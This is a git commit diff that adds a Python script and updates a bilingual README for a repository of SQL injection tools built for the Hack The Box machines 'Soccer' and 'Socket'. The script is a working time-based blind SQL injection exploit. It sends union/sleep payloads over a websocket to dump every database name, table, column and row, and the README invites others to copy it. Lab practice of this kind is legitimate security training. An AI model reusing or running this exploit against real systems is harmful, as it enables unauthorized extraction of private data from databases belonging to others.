d342e1473de65ea4befcdfc3f0e621d537b12a34
Tnr1112 <tnr111201@gmail.com>
2023-03-30 10:55:07 -0300

    Performance changes and SQLite union based script

---
+++ MySQL/timedBased.py
@@ -0,0 +1,93 @@
+import json, signal, sys
+from websocket import create_connection
+from pwn import *
+import time, string
+
+payloadTemplates = {"DatabasesName":"(select SCHEMA_NAME from information_schema.schemata where schema_name not in ('information_schema','performance_schema','mysql','sys') limit %d,1)",
+"TableNames":"(select TABLE_NAME from information_schema.tables where table_schema = '{databaseName}' limit %d,1)",
+"ColumnNames":"(select column_name from information_schema.columns where table_schema = '{databaseName}' and table_name = '{tableName}' limit %d,1)",
+"ValueNames":"(select concat_ws(',',{columnsName}) from {databaseName}.{tableName} limit %d,1)"}
+alphabet = string.printable
+ws_server = "ws://soc-player.soccer.htb:9091"
+ws = create_connection(ws_server)
+
+def formatOne(s: str, field: str, value: str):
+	idx_begin = s.find('{'+field+'}')
+	idx_end = idx_begin + len(field) + 2
+	return s[:idx_begin] + value + s[idx_end:]
+
+def findValues(payloadTemplate):
+	valuesFounded = []
+
+	endOfRows = False
+	rowCounter = 0
+
+	while(not endOfRows):
+		foundValue = ""
+		actualValue.status(foundValue)
+		endOfValue = False
+		currentPosition = 1
+		while(not endOfValue):
+			payloadTemplateFormated = payloadTemplate % rowCounter
+			for character in alphabet:
+				payload = '''"" or 1=1 union select 1,2,if(binary substr(%s,%d,1) = '%s', sleep(11),0) -- -''' % (payloadTemplateFormated,currentPosition,character)
+
+				data = {
+						"id": payload,
+				}
+
+				bar.status(f"Trying {payloadTemplateFormated} with character {character} on position {currentPosition}")
+
+				dataJSON = json.dumps(data)
+				startTime = time.time()
+				ws.send(dataJSON)
+				ws.recv()
+				endTime = time.time()
+				respTime = endTime - startTime
+				if respTime > 11:
+					foundValue += character
+					actualValue.status(foundValue)
+					currentPosition = currentPosition + 1
+					break
+				elif character == alphabet[-1]:
+					endOfValue = True
+					rowCounter = rowCounter + 1
+					if currentPosition == 1:
+						endOfRows = True
+					else:
+						valuesFounded.append(foundValue)
+						log.info(f"  •{foundValue}")
+	return valuesFounded
+
+def def_handler(sig, frame):
+        print("\n\n[!] Saliendo...\n")
+        sys.exit(1)
+
+#Ctrl + c
+signal.signal(signal.SIGINT, def_handler)
+
+bar = log.progress("SQLI Timed based")
+bar.status("Starting")
+actualValue = log.progress("Actual value")
+
+print("-----------------------------------------------------------------------------------")
+log.info("Database names:")
+databases = findValues(payloadTemplates["DatabasesName"])
+print("-----------------------------------------------------------------------------------")
+
+for database in databases:
+	log.info("Table names:")
+	tables = findValues(formatOne(payloadTemplates["TableNames"],"databaseName",database))
+	print("-----------------------------------------------------------------------------------")
+
+	for table in tables:
+		log.info(f"Column names from table {table}:")
+		payloadTemplateDatabase = formatOne(payloadTemplates["ColumnNames"], "databaseName", database)
+		columns = findValues(formatOne(payloadTemplateDatabase,"tableName",table))
+		columnsToConcat = (",".join(columns))
+		print("\n")
+		log.info(f"Columns: {columnsToConcat}")
+		payloadTemplateDatabase = formatOne(payloadTemplates["ValueNames"], "databaseName", database)
+		payloadTemplateTable = formatOne(payloadTemplateDatabase,"tableName",table)
+		values = findValues(formatOne(payloadTemplateTable,"columnsName",columnsToConcat))
+		print("-----------------------------------------------------------------------------------")
--- README.md
+++ README.md
@@ -1,19 +1,24 @@
 # SQLI_Websocket
 
-Es una utilidad que permite encontrar todas las bases de datos, junto con sus tablas, columnas y todas las filas existentes. Originalmente fue creado para la máquina "Soccer" de "Hack The Box". Cualquiera es libre de copiarlo y modificarlo a su gusto.
+Es una utilidad que permite encontrar todas las bases de datos, junto con sus tablas, columnas y todas las filas existentes. Originalmente fueron creados para la máquina "Soccer" y "Socket" de "Hack The Box". Cualquiera es libre de copiarlo y modificarlo a su gusto.
 
-Tiene las dos formas de blind SQLI, **timed based** y **boolean based**.
+Tiene las dos formas de blind SQLI para MySQL, **timed based** y **boolean based**.
+Y tiene **union based** para SQLite.
 
 ---
 
-It is an utility that allows you to find all databases, along with their tables, columns and all existent rows. It was originally created for the "Soccer" machine of "Hack The Box". Feel free to copy and modify it as you need.
+It is an utility that allows you to find all databases, along with their tables, columns and all existent rows. They was originally created for the "Soccer" and "Socket" machine of "Hack The Box". Feel free to copy and modify it as you need.
 
-There are two ways scripted, **timed based** and **boolean based**.
+There are two ways scripted for MySQL, **timed based** and **boolean based**.
+And it has **union based** for SQLite.
 
 ## Ejemplos/Examples
 
-### Boolean based
-![](images/blindBased.png)
+### Boolean based (MySQL)
+![Blind based](images/MySQLBlindBased.png)
 
-### Timed based
-![](images/timedBased.png)
+### Timed based (MySQL)
+![Timed based](images/MySQLTimedBased.png)
+
+### Union based (SQLite)
+![Union based](images/SQLiteUnionBased.png)
